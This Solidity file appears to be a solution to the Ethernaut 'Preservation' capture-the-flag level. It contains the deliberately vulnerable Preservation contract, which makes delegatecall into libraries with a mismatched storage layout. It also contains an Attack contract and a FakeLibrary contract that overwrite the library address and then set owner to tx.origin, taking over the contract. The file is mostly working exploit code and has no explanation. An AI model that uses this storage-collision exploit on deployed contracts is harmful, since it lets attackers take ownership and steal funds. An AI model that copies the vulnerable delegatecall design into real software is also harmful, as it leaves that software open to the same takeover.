//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {
  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Attack {
  address _addr = 0xf8e81D47203A594245E36C48e151709F0C19fBe8;
  address fakeLibrary = 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95;

  bytes encodedParams = abi.encodeWithSelector(bytes4(keccak256("setFirstTime(uint256)")), fakeLibrary);

  function kek() public {
    (bool success,) = address(_addr).call(encodedParams);
    require(success,"no kek");
  }
}

contract FakeLibrary {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  bool public checked;

  function setTime(uint _time) public {
    owner = tx.origin;
  }

}
